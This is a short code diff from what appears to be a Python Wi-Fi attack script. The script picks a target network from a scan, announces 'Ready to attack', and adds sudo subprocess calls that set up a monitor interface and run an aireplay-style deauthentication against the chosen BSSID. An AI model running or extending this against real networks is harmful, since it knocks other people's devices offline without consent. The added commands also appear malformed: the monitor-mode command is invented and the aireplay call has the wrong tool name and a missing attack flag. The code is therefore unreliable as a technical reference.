@@ -84,7 +84,7 @@ try:
             time.sleep(1)
 except KeyboardInterrupt:
     print("\n Ready to attack")
-    
+
 
 while True:
     try:
@@ -93,7 +93,12 @@ while True:
             break
     except:
         print("Invalid choice")
-        
 
-hackBssid =  activeWirelessNetworks[int(target)]["BSSID"]
+
+hackBssid = activeWirelessNetworks[int(target)]["BSSID"]
 hackChannel = activeWirelessNetworks[int(target)]["channel"].strip()
+
+subprocess.run(["sudo", "start", "hacknet" + "mon", hackChannel])
+
+subprocess.run(["sudo", "aireplay", "0", "-a", hackBssid,
+               checkWifiResult[int(wifiInterfaceChoice)] + "mon"])
